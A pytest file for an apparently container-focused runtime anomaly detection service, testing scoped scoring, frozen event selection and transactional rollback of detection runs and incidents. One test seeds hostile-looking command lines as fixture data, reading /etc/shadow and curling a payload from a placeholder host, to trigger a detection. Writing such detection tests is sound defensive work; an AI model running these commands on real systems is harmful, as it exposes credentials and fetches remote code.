"""Scoped orchestration preserves transactions and frozen event selection."""

from datetime import datetime, timedelta, timezone
from uuid import uuid4
import pytest
from test_incident_grouping import engine as engine
from sqlalchemy import select, func, text
from sqlalchemy.orm import Session
from porygon_api import assessment_service as service
from porygon_api.models import (
    ContainerIdentity,
    BehaviorProfile,
    ProcessExecEvent,
    AssessmentTarget,
    ManagedProfile,
    AnomalyScore,
    DetectionRun,
    Incident,
    KernelRuntimeEvent,
)
from porygon_api.baseline import COMMAND_LINEAGE_SCHEMA
from porygon_api.profile_lifecycle import (
    TargetIn,
    CandidateIn,
    BenignInterval,
    enroll_target,
    propose_profile,
    shadow_profile,
    activate_profile,
)
from porygon_api.schemas import AnomalyScoreComputeIn, DetectionRunIn

CID = "c" * 64
DIGEST = "managed/app@sha256:" + "d" * 64
NOW = datetime.now(timezone.utc).replace(microsecond=0)
START = NOW - timedelta(seconds=100)


@pytest.fixture
def assessment_engine(engine):
    if engine.dialect.name == "sqlite":
        with engine.begin() as connection:
            # Match the production PostgreSQL partial index in the fast fixture.
            connection.execute(
                text("DROP INDEX uq_behavior_profiles_one_active_digest")
            )
            connection.execute(
                text(
                    "CREATE UNIQUE INDEX uq_behavior_profiles_one_active_digest ON behavior_profiles(image_digest) WHERE status='active'"
                )
            )
    return engine


def event(db, at, *, host="host-a", cid=CID, name="python", command="python app.py"):
    identifier = uuid4().hex * 2
    row = ProcessExecEvent(
        event_id=identifier,
        sensor_instance_id="sensor",
        source="falco",
        rule_name="exec",
        priority="Notice",
        occurred_at=at,
        time_nano=int(at.timestamp() * 1e9),
        event_type="execve",
        docker_host_id=host,
        container_id=cid,
        reported_container_id=cid,
        image_digest=DIGEST,
        correlation_status="resolved",
        process_pid=123,
        process_name=name,
        executable="/usr/bin/" + name,
        command_line=command,
        parent_name="python",
        parent_executable="/usr/bin/python",
        user_uid=1000,
        raw_event={},
        received_at=NOW,
    )
    db.add(row)
    return row


def kernel_event(db, at, *, host="host-a", cid=CID):
    row = KernelRuntimeEvent(
        event_id=uuid4().hex + uuid4().hex,
        sensor_instance_id="sensor-kernel",
        sensor_epoch="epoch-a",
        process_start_ns=int((at - timedelta(seconds=1)).timestamp() * 1e9),
        pid_namespace_start_ns=int((at - timedelta(seconds=10)).timestamp() * 1e9),
        source="falco",
        rule_name="Porygon Container Outbound Connection",
        priority="Notice",
        occurred_at=at,
        time_nano=int(at.timestamp() * 1e9),
        event_type="connect",
        runtime_action="net_outbound",
        return_value=0,
        reported_container_id=cid,
        docker_host_id=host,
        container_id=cid,
        image_id="image-id",
        image_ref="managed/app:latest",
        image_digest=DIGEST,
        correlation_status="resolved",
        process_pid=123,
        process_name="python",
        executable="/usr/bin/python",
        remote_address="192.0.2.10",
        remote_port=443,
        output_fields={},
        raw_event={},
        received_at=NOW,
    )
    db.add(row)
    return row


def setup_target(db, activate=True):
    db.add(
        ContainerIdentity(
            docker_host_id="host-a",
            container_id=CID,
            image_digest=DIGEST,
            image_digest_status="resolved",
            current_snapshot={
                "config": {"user": "1000"},
                "host_config": {"privileged": False},
            },
            first_seen_at=NOW,
            last_seen_at=NOW,
        )
    )
    db.commit()
    target = enroll_target(
        TargetIn(
            docker_host_id="host-a",
            container_id=CID,
            image_digest=DIGEST,
            start_at=START,
            window_seconds=10,
            allowed_lateness_seconds=0,
        ),
        db,
    )
    for i in range(12):
        event(db, NOW - timedelta(seconds=390 - i * 3))
        event(db, NOW - timedelta(seconds=240 - i))
    db.commit()
    proposal = propose_profile(
        target.target_id,
        CandidateIn(
            reference="controlled benign collection",
            feature_schema_version=COMMAND_LINEAGE_SCHEMA,
            minimum_process_events=10,
            intervals=[
                BenignInterval(
                    name="training",
                    label="benign",
                    start_at=NOW - timedelta(seconds=400),
                    end_at=NOW - timedelta(seconds=340),
                )
            ],
        ),
        db,
    )["enrollment"]
    if activate:
        shadow_profile(
            target.target_id,
            proposal.enrollment_id,
            BenignInterval(
                name="shadow",
                label="benign",
                start_at=NOW - timedelta(seconds=250),
                end_at=NOW - timedelta(seconds=220),
            ),
            db,
        )
        activate_profile(target.target_id, proposal.enrollment_id, db)
    return target.target_id, proposal.enrollment_id


def test_local_image_target_candidate_uses_exact_image_id_only(assessment_engine):
    local_id = "sha256:" + "e" * 64
    local_identity = "local:" + local_id
    with Session(assessment_engine) as db:
        db.add(
            ContainerIdentity(
                docker_host_id="host-local",
                container_id=CID,
                image_id=local_id,
                image_digest=None,
                image_digest_status="unavailable",
                current_snapshot={"config": {"user": "1000"}, "host_config": {}},
                first_seen_at=NOW,
                last_seen_at=NOW,
            )
        )
        db.commit()
        target = enroll_target(
            TargetIn(
                docker_host_id="host-local",
                container_id=CID,
                image_digest=local_identity,
                start_at=START,
                window_seconds=5,
                allowed_lateness_seconds=0,
            ),
            db,
        )
        for i in range(22):
            row = event(
                db,
                NOW - timedelta(seconds=130 - i),
                host="host-local",
            )
            row.image_digest = None
            row.image_id = local_id if i < 20 else "sha256:" + "f" * 64
        db.commit()
        candidate = propose_profile(
            target.target_id,
            CandidateIn(
                reference="local immutable image candidate",
                feature_schema_version=COMMAND_LINEAGE_SCHEMA,
                minimum_process_events=20,
                minimum_nonempty_windows=2,
                intervals=[
                    BenignInterval(
                        name="local-training",
                        label="benign",
                        start_at=NOW - timedelta(seconds=140),
                        end_at=NOW - timedelta(seconds=110),
                    )
                ],
            ),
            db,
        )["enrollment"]
        profile = db.get(BehaviorProfile, candidate.profile_id)
        assert profile.image_digest == local_identity
        assert profile.process_event_count == 20
        assert profile.quality["passed"]
        observation = event(
            db,
            NOW - timedelta(seconds=48),
            host="host-local",
        )
        observation.image_digest = None
        observation.image_id = local_id
        db.commit()
        score = service.compute_anomaly_score(
            AnomalyScoreComputeIn(
                image_digest=local_identity,
                profile_id=profile.profile_id,
                window_start=NOW - timedelta(seconds=50),
            ),
            db,
            commit=False,
        )
        assert score.observation_manifest["process_event_count"] == 1
        assert score.status in {"scored", "insufficient_data"}


def test_scoped_detection_uses_frozen_selection_and_rollback_is_atomic(
    assessment_engine, monkeypatch
):
    with Session(assessment_engine) as db:
        target_id, enrollment_id = setup_target(db)
        target = db.get(AssessmentTarget, target_id)
        enrollment = db.get(ManagedProfile, enrollment_id)
        event(db, START + timedelta(seconds=1))
        event(
            db,
            START + timedelta(seconds=2),
            host="host-b",
            name="bash",
            command="bash -c suspicious",
        )
        selected_kernel = kernel_event(db, START + timedelta(seconds=2))
        kernel_event(db, START + timedelta(seconds=2), host="host-b")
        db.commit()
        scope = service.AssessmentScope("host-a", CID, target.context_hash)
        score = service.compute_anomaly_score(
            AnomalyScoreComputeIn(
                image_digest=DIGEST,
                profile_id=enrollment.profile_id,
                window_start=START,
            ),
            db,
            scope=scope,
            commit=False,
        )
        assert score.process_event_count == 1
        assert score.assessment_scope["container_id"] == CID
        event(
            db, START + timedelta(seconds=3), name="bash", command="bash -c suspicious"
        )
        db.flush()
        observed = []
        observed_kernel = []
        original = service.evaluate_detection

        def capture(**kwargs):
            observed.extend(kwargs["process_events"])
            observed_kernel.extend(kwargs.get("kernel_events") or [])
            return original(**kwargs)

        monkeypatch.setattr(service, "evaluate_detection", capture)
        service.run_detection(
            DetectionRunIn(anomaly_score_id=score.score_id), db, commit=False
        )
        assert len(observed) == 1 and observed[0].process_name == "python"
        assert [row.event_id for row in observed_kernel] == [selected_kernel.event_id]
        run = db.scalar(select(DetectionRun).where(DetectionRun.score_id == score.score_id))
        assert run is not None
        assert run.custom_rule_snapshot["snapshot_hash"]
        assert run.custom_rule_snapshot["ruleset_hash"] == run.custom_ruleset_hash
        assert run.custom_rule_interpreter_hash == run.custom_rule_snapshot["interpreter_hash"]
        assert run.result["kernel_evidence"][0]["event_id"] == selected_kernel.event_id
        db.rollback()
        assert (
            db.scalar(
                select(func.count())
                .select_from(AnomalyScore)
                .where(AnomalyScore.image_digest == DIGEST)
            )
            == 0
        )
        assert (
            db.scalar(
                select(func.count())
                .select_from(DetectionRun)
                .where(DetectionRun.image_digest == DIGEST)
            )
            == 0
        )
        assert (
            db.scalar(
                select(func.count())
                .select_from(Incident)
                .where(Incident.image_digest == DIGEST)
            )
            == 0
        )


def test_real_incident_evidence_joins_atomic_transaction(assessment_engine):
    from porygon_api.models import IncidentEvidence

    with Session(assessment_engine) as db:
        target_id, enrollment_id = setup_target(db)
        for i in range(12):
            row = event(
                db,
                START + timedelta(milliseconds=100 + i * 500),
                name="bash" if i % 2 == 0 else "curl",
                command="bash -c cat /etc/shadow"
                if i % 2 == 0
                else "curl http://controlled.invalid/payload",
            )
            row.user_uid = 0
        db.commit()
        target = db.get(AssessmentTarget, target_id)
        profile = db.get(ManagedProfile, enrollment_id)
        score = service.compute_anomaly_score(
            AnomalyScoreComputeIn(
                image_digest=DIGEST, profile_id=profile.profile_id, window_start=START
            ),
            db,
            scope=service.AssessmentScope("host-a", CID, target.context_hash),
            commit=False,
        )
        result = service.run_detection(
            DetectionRunIn(anomaly_score_id=score.score_id), db, commit=False
        )
        assert score.status == "scored"
        assert result["incident"] is not None and result["timeline"]
        assert db.scalar(select(func.count()).select_from(IncidentEvidence)) > 0
        db.rollback()
        assert (
            db.scalar(
                select(func.count())
                .select_from(AnomalyScore)
                .where(AnomalyScore.image_digest == DIGEST)
            )
            == 0
        )
        assert (
            db.scalar(
                select(func.count())
                .select_from(DetectionRun)
                .where(DetectionRun.image_digest == DIGEST)
            )
            == 0
        )
        assert (
            db.scalar(
                select(func.count())
                .select_from(Incident)
                .where(Incident.image_digest == DIGEST)
            )
            == 0
        )
        assert db.scalar(select(func.count()).select_from(IncidentEvidence)) == 0
        assert (
            db.get(AssessmentTarget, target_id) is not None
            and db.get(ManagedProfile, enrollment_id) is not None
        )


def test_missing_frozen_evidence_cannot_be_reinterpreted(assessment_engine):
    from fastapi import HTTPException
    from sqlalchemy import delete

    with Session(assessment_engine) as db:
        target_id, enrollment_id = setup_target(db)
        item = event(db, START + timedelta(seconds=1))
        db.commit()
        target = db.get(AssessmentTarget, target_id)
        profile = db.get(ManagedProfile, enrollment_id)
        score = service.compute_anomaly_score(
            AnomalyScoreComputeIn(
                image_digest=DIGEST, profile_id=profile.profile_id, window_start=START
            ),
            db,
            scope=service.AssessmentScope("host-a", CID, target.context_hash),
        )
        db.execute(
            delete(ProcessExecEvent).where(ProcessExecEvent.event_id == item.event_id)
        )
        db.commit()
        with pytest.raises(HTTPException) as error:
            service.run_detection(
                DetectionRunIn(anomaly_score_id=score.score_id), db, commit=False
            )
        assert error.value.status_code == 409
